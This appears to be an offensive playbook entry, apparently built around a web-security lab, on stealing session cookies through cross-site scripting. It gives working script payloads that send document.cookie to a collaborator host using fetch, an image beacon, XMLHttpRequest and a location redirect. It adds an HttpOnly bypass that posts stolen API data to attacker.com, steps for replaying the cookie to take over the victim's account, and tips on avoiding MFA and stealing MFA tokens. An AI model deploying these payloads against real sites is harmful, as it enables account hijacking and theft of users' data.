# XSS — Cookie Theft

## When this applies

The target reflects or stores attacker JavaScript that executes in a victim's browser session, and session cookies are accessible to JavaScript (no `HttpOnly` flag). Useful for impersonating the victim and gaining unauthorized access to their account.

## Technique

Steal session cookies via DOM access (`document.cookie`) and exfiltrate to attacker-controlled endpoint (Burp Collaborator, attacker server). Several delivery channels work: `fetch()`, `Image`, `XMLHttpRequest`, `document.location`.

## Steps

1. **Access Burp Collaborator**:
   - Open Burp Suite
   - Navigate to Burp Collaborator client
   - Click "Copy to clipboard" to get unique subdomain

2. **Craft Cookie Theft Payload**:
   ```javascript
   <script>
   fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
       method: 'POST',
       mode: 'no-cors',
       body: document.cookie
   });
   </script>
   ```

3. **Inject Payload**:
   - Navigate to any blog post
   - Post a comment with the malicious script
   - Fill in required fields (name, email, website)
   - Submit the comment

4. **Monitor Burp Collaborator**:
   - Return to Burp Collaborator client
   - Click "Poll now"
   - Wait for HTTP interactions
   - Locate POST request body containing victim's cookie

5. **Use Stolen Cookie**:
   - Open Burp Proxy → HTTP history
   - Find request to /my-account
   - Send to Repeater
   - Replace your session cookie with victim's cookie
   - Send request
   - Access victim's account

### Alternative Payloads

**Using Image Beacon**:
```javascript
<script>
new Image().src='https://BURP-COLLABORATOR-SUBDOMAIN?c='+encodeURIComponent(document.cookie);
</script>
```

**Using XMLHttpRequest**:
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://BURP-COLLABORATOR-SUBDOMAIN?cookie='+document.cookie, true);
xhr.send();
</script>
```

**Using Location Redirect**:
```javascript
<script>
document.location='https://BURP-COLLABORATOR-SUBDOMAIN?c='+document.cookie;
</script>
```

### HTTP Request to Exfiltrate:
```http
POST /UNIQUE-ID HTTP/1.1
Host: BURP-COLLABORATOR-SUBDOMAIN
User-Agent: Mozilla/5.0...
Content-Type: text/plain
Content-Length: 32

secret=ABC123; session=XYZ456
```

## Verifying success

- Burp Collaborator client shows HTTP/DNS interaction with victim's cookie value in body or query string.
- Replaying request to `/my-account` (or equivalent) with stolen cookie returns the victim's profile / privileged data.
- Authenticated endpoints return 200 instead of 302 → /login when using stolen cookie.

## Common pitfalls

1. **Not URL-encoding the cookie value** — special characters like `;`, `=`, `+` corrupt the request.
2. **Using GET with long cookies (URL length limits)** — long session tokens may exceed 2048-byte URLs.
3. **Forgetting to use no-cors mode** — request fails CORS preflight, cookie never reaches you.
4. **Not checking Collaborator frequently enough** — session may expire before you poll.
5. **Testing with your own cookie (HttpOnly may apply)** — `document.cookie` returns empty for HttpOnly cookies.

### Cookie Protection Bypass

**HttpOnly Flag**:
- Cookies with HttpOnly cannot be accessed by JavaScript
- `document.cookie` returns empty for HttpOnly cookies
- **Bypass**: Instead of stealing cookie, make authenticated requests on victim's behalf

```javascript
<script>
// Can't steal HttpOnly cookie, but can perform actions as victim
fetch('/api/sensitive-data')
    .then(r => r.text())
    .then(data => {
        // Exfiltrate response data instead
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: data
        });
    });
</script>
```

**SameSite Attribute**:
- `SameSite=Strict`: Never sent with cross-site requests
- `SameSite=Lax`: Sent only with top-level navigation
- `SameSite=None`: Sent with cross-site requests (requires Secure)
- **Impact**: XSS on same domain bypasses SameSite protection

### Real-World Considerations

**Cookie Expiration**:
- Session cookies may expire quickly
- Use stolen cookie immediately
- Implement keep-alive mechanism if possible

**IP-Based Validation**:
- Some applications validate session by IP address
- May need to proxy through victim's IP
- Less common in modern applications

**Multi-Factor Authentication**:
- MFA may prevent account takeover even with valid cookie
- Focus on actions that don't trigger MFA
- Steal MFA tokens if possible

## Tools

- **Burp Collaborator** — out-of-band exfiltration channel
- **Burp Proxy / Repeater** — replaying requests with stolen cookie
- **XSS Hunter** — blind XSS detection with cookie capture
- **Browser DevTools** — local payload testing before delivery
